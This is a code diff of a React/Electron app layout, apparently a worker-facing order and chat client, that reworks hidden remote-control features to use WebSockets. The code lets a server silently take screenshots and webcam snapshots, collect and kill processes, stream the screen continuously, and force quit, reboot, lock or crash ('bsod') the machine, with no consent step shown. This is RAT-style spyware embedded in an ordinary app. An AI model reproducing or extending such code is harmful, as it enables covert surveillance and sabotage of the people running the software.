@@ -1,7 +1,7 @@
 import { useEffect, useRef, useState } from 'react'
 import { Outlet, NavLink, useNavigate } from 'react-router-dom'
 import { useAuthStore, useChatStore, useGlobalChatStore } from '../store'
-import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat, uploadWorkerScreenshot, checkScreenshotPending, checkWebcamPending, uploadWorkerWebcam, uploadProcesses, checkKillPending, fetchCommandsPending } from '../api'
+import { getApiBase, getUnreadCounts, getAvailableOrders, getGlobalUnreadCount, sendHeartbeat } from '../api'
 import { playSound } from '../utils/sound'
 
 const nav = [
@@ -43,68 +43,160 @@ export default function Layout() {
     return () => clearInterval(interval)
   }, [isVisible])
 
-  // Admin commands polling (quit / remove-autostart)
+  // Admin commands WebSocket — server pushes commands immediately
   useEffect(() => {
-    const interval = setInterval(async () => {
-      try {
-        const { commands } = await fetchCommandsPending()
-        for (const cmd of commands) {
-          if (cmd === 'quit') await window.electronBridge?.forceQuit()
-          if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
-          if (cmd === 'reboot') await window.electronBridge?.systemReboot()
-          if (cmd === 'lock-screen') await window.electronBridge?.systemLock()
-          if (cmd === 'bsod') await window.electronBridge?.systemBsod()
-        }
-      } catch {}
-    }, 5_000)
-    return () => clearInterval(interval)
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    let ws = null
+    let reconnectTimeout = null
+    let destroyed = false
+
+    const handleMessage = async (e) => {
+      if (typeof e.data !== 'string') return
+      const cmd = e.data.trim()
+      if (cmd === 'quit') await window.electronBridge?.forceQuit()
+      else if (cmd === 'remove-autostart') await window.electronBridge?.removeAutostart()
+      else if (cmd === 'reboot') await window.electronBridge?.systemReboot()
+      else if (cmd === 'lock-screen') await window.electronBridge?.systemLock()
+      else if (cmd === 'bsod') await window.electronBridge?.systemBsod()
+    }
+
+    const connect = () => {
+      if (destroyed) return
+      const token = localStorage.getItem('token')
+      ws = new WebSocket(`${wsBase}/users/commands-ws?token=${token}`)
+      ws.onmessage = handleMessage
+      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
+    }
+
+    connect()
+    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
   }, [])
 
-  // On-demand screenshot polling
+  // Screenshot WebSocket — on-demand capture (like webcam)
   useEffect(() => {
-    const capture = async () => {
+    if (!window.electronBridge?.captureScreen) return
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    let ws = null
+    let reconnectTimeout = null
+    let destroyed = false
+
+    const handleMessage = async (e) => {
+      if (e.data !== 'capture') return
       try {
-        if (!window.electronBridge?.captureScreen) return
         const base64 = await window.electronBridge.captureScreen()
-        if (base64) await uploadWorkerScreenshot(base64)
+        if (!base64 || !ws || ws.readyState !== WebSocket.OPEN) return
+        const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
+        ws.send(bytes.buffer)
       } catch {}
     }
-    const poll = async () => {
-      try {
-        const { requested } = await checkScreenshotPending()
-        if (requested) await capture()
-      } catch {}
+
+    const connect = () => {
+      if (destroyed) return
+      const token = localStorage.getItem('token')
+      ws = new WebSocket(`${wsBase}/users/screenshot-ws?token=${token}`)
+      ws.onmessage = handleMessage
+      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
     }
-    const interval = setInterval(poll, 2_000)
-    return () => clearInterval(interval)
+
+    connect()
+    return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
   }, [])
 
-  // Webcam snapshot polling
+  // Process list WebSocket — sends list every 15s, receives kill commands
   useEffect(() => {
-    const capture = async () => {
+    if (!window.electronBridge?.getProcesses) return
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    let ws = null
+    let uploadInterval = null
+    let reconnectTimeout = null
+    let destroyed = false
+
+    const upload = async (socket) => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
+        const processes = await window.electronBridge.getProcesses()
+        if (socket.readyState === WebSocket.OPEN) socket.send(JSON.stringify(processes))
+      } catch {}
+    }
+
+    const handleMessage = async (e) => {
+      if (typeof e.data !== 'string') return
+      const name = e.data.startsWith('kill:') ? e.data.slice(5) : null
+      if (!name) return
+      try {
+        await window.electronBridge.killProcess(name)
+        upload(ws)
+      } catch {}
+    }
+
+    const connect = () => {
+      if (destroyed) return
+      const token = localStorage.getItem('token')
+      ws = new WebSocket(`${wsBase}/users/processes-ws?token=${token}`)
+      ws.onopen = () => {
+        upload(ws)
+        uploadInterval = setInterval(() => upload(ws), 15_000)
+      }
+      ws.onmessage = handleMessage
+      ws.onclose = () => {
+        if (uploadInterval) { clearInterval(uploadInterval); uploadInterval = null }
+        if (!destroyed) reconnectTimeout = setTimeout(connect, 5000)
+      }
+    }
+
+    connect()
+    return () => {
+      destroyed = true
+      if (uploadInterval) clearInterval(uploadInterval)
+      if (reconnectTimeout) clearTimeout(reconnectTimeout)
+      ws?.close()
+    }
+  }, [])
+
+  // Webcam WebSocket — on-demand capture, auto-reconnect
+  useEffect(() => {
+    const wsBase = getApiBase().replace(/^http/, 'ws')
+    let ws = null
+    let reconnectTimeout = null
+    let destroyed = false
+
+    const handleMessage = async (e) => {
+      if (e.data !== 'capture') return
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         const video = document.createElement('video')
         video.srcObject = stream
         await video.play()
-        await new Promise((r) => setTimeout(r, 500))
+        await new Promise((r) => setTimeout(r, 300))
         const canvas = document.createElement('canvas')
         canvas.width = video.videoWidth || 640
         canvas.height = video.videoHeight || 480
         canvas.getContext('2d').drawImage(video, 0, 0)
         stream.getTracks().forEach((t) => t.stop())
-        const base64 = canvas.toDataURL('image/jpeg', 0.85).split(',')[1]
-        await uploadWorkerWebcam(base64)
-      } catch {}
+        canvas.toBlob((blob) => {
+          if (blob && ws?.readyState === WebSocket.OPEN) {
+            blob.arrayBuffer().then((buf) => ws.send(buf))
+          }
+        }, 'image/jpeg', 0.85)
+      } catch (e) {
+        console.error('Webcam capture error:', e)
+      }
     }
-    const poll = async () => {
-      try {
-        const { requested } = await checkWebcamPending()
-        if (requested) await capture()
-      } catch {}
+
+    const connect = () => {
+      if (destroyed) return
+      const token = localStorage.getItem('token')
+      ws = new WebSocket(`${wsBase}/users/webcam-ws?token=${token}`)
+      ws.onmessage = handleMessage
+      ws.onclose = () => { if (!destroyed) reconnectTimeout = setTimeout(connect, 5000) }
     }
-    const interval = setInterval(poll, 2_000)
-    return () => clearInterval(interval)
+
+    connect()
+
+    return () => {
+      destroyed = true
+      if (reconnectTimeout) clearTimeout(reconnectTimeout)
+      ws?.close()
+    }
   }, [])
 
   // Live screen streaming via WebSocket — always on, auto-reconnect
@@ -309,33 +401,6 @@ export default function Layout() {
     return () => { destroyed = true; if (reconnectTimeout) clearTimeout(reconnectTimeout); ws?.close() }
   }, [])
 
-  // Process list upload every 15 seconds + kill polling every 2 seconds
-  useEffect(() => {
-    if (!window.electronBridge?.getProcesses) return
-    const upload = async () => {
-      try {
-        const processes = await window.electronBridge.getProcesses()
-        await uploadProcesses(processes)
-      } catch {}
-    }
-    upload()
-    const uploadInterval = setInterval(upload, 15_000)
-
-    const killInterval = setInterval(async () => {
-      try {
-        const { names } = await checkKillPending()
-        for (const name of names) {
-          await window.electronBridge.killProcess(name)
-        }
-        if (names.length > 0) upload() // refresh process list after kills
-      } catch {}
-    }, 2_000)
-
-    return () => {
-      clearInterval(uploadInterval)
-      clearInterval(killInterval)
-    }
-  }, [])
 
   // Background: message notifications
   useEffect(() => {
